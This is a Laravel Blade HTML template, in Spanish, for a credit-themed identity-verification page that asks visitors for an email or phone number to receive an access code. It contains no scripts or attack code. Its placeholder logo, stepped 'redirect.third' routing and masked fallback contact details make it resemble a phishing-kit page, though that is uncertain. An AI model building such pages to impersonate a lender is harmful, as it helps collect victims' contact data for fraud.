<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
        <head>
            <meta charset="UTF-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Tranquilidad | Credito</title>
            <link rel="stylesheet" href="{{ asset('css/layout.css') }}">
            <style>

                .second-sec{
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    font-size: 15px;
                }

                .second-sec p{
                    margin: 0 15px;
                    text-align: center;
                }

                .third-sec{
                    font-weight: bold;
                    margin: 0 20px;
                    text-align: center;
                    font-size: 15px;
                }

                .third-sec p{
                    color:  #262650;
                }

                h2{
                    color:  #262650;
                }

                .email-box, .phone-box{
                    display: flex;
                    flex-direction: column;
                    justify-content: center;
                    align-items: center;
                    margin: 10px 0;
                    text-align: center;
                    font-size: 15px;
                }

                input[type=text]{
                    padding: 13px 40px;
                    height: 10px;
                    border-radius: 10px;
                    border: none;
                    margin: 5px 0;
                    text-align: center;
                }

                .submit{
                    margin: 5px 0;
                }

                .btn-box button{
                    margin-top: 1rem;
                    padding: 5px 20px;
                    background-color: transparent;
                    border: 2px solid #262650;
                    color: #262650;
                    font-weight: bold;
                }


    </style>
</head>
<body>
    <section class="text-container">

        <section class="logo-container">
            <h1>Logo</h1>
        </section>

        <section class="second-sec">
            <h2>Tu tranquilidad es primero</h2>
            <p>Para brindarte las mejores soluciones debemos confirmar tu identidad, enviaremos un c&oacute;digo de acceso al email o n&uacute;mero telef&oacute;nico registrado</p>
        </section>

        <section class="third-sec">
            <p>Selecciona una de las opciones y complete la informaci&oacute;n</p>
        </section>


        <section class="email-box">
            <form action="{{route('redirect.third')}}" method="POST">
                @csrf
                @if($email)
                    <span>{{$email}}</span>
                @else
                    <span>franc*******@*******.com</span>
                @endif
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-envelope" viewBox="0 0 16 16" style="margin-right: 10px;">
                    <path fill=" #262650" d="M0 4a2 2 0 0 1 2-2h12a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V4Zm2-1a1 1 0 0 0-1 1v.217l7 4.2 7-4.2V4a1 1 0 0 0-1-1H2Zm13 2.383-4.708 2.825L15 11.105V5.383Zm-.034 6.876-5.64-3.471L8 9.583l-1.326-.795-5.64 3.47A1 1 0 0 0 2 13h12a1 1 0 0 0 .966-.741ZM1 11.105l4.708-2.897L1 5.383v5.722Z"/>
                </svg>
                <input type="text" placeholder="Ingresar email" name="email">
                @error('email')
                    <div class="is-invalid">{{ $message }}</div>
                @enderror
            </div>
            <input type="submit" class="submit" value="Ingresar">
        </section>

        <section class="phone-box">
            <span>316************</span>
            <div>
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" class="bi bi-phone" viewBox="0 0 16 16" style="margin-right: 10px;">
                    <path fill="#262650" d="M11 1a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H5a1 1 0 0 1-1-1V2a1 1 0 0 1 1-1h6zM5 0a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h6a2 2 0 0 0 2-2V2a2 2 0 0 0-2-2H5z"/>
                    <path fill="#262650" d="M8 14a1 1 0 1 0 0-2 1 1 0 0 0 0 2z"/>
                </svg>
                <input type="text" placeholder="Ingresar número telefónico" value="{{$phone}}" name="phone">
                @error('phone')
                    <div class="is-invalid">{{ $message }}</div>
                @enderror
            </div>
            <input type="submit" class="submit" value="Ingresar">
        </section>
    </form>

        <section class="btn-box">
            <button>No son mis datos</button>
        </section>
    </section>
</body>
</html>
